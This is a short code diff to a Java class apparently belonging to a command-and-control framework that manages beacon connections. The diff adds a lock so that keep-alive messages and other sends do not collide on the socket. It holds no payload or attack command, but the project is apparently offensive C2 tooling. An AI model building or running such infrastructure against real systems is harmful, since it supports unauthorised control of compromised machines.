@@ -17,6 +17,7 @@ public class C2ServerBeaconHandler implements Runnable{
     // Class and Thread that send a KEEP_ALIVE Messsage to the Beacon Server every 30 seconds to keep the socket open
     private keepAlive keepAliveClass;
     private Thread keepAliveThread;
+    private Object sendLock;
     
 
     /**
@@ -30,7 +31,8 @@ public class C2ServerBeaconHandler implements Runnable{
         this.duplexer = duplexer;
         this.IP = IP;
         this.C2server = server;
-        this.keepAliveClass = new keepAlive(duplexer, false, false);
+        this.sendLock = new Object();
+        this.keepAliveClass = new keepAlive(duplexer, sendLock, false, false);
         this.keepAliveThread = new Thread(keepAliveClass);
     }
 
@@ -40,7 +42,9 @@ public class C2ServerBeaconHandler implements Runnable{
      * @param message
      */
     protected void sendToBeacon(String message){
-        duplexer.send(message);
+        synchronized(sendLock){
+            duplexer.send(message);
+        }
     }
 
     @Override
